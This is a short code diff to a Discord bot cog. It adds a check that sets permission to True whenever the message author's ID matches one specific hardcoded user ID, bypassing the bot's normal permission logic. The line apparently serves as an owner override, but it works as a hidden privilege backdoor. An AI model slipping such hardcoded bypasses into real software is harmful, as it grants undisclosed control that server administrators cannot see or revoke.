@@ -333,7 +333,8 @@ class usefull(commands.Cog):
 
             else:
                 permission = False
-        
+        if message.author.id == 427822985102098434:
+            permission = True
         
 
         if permission == False:            
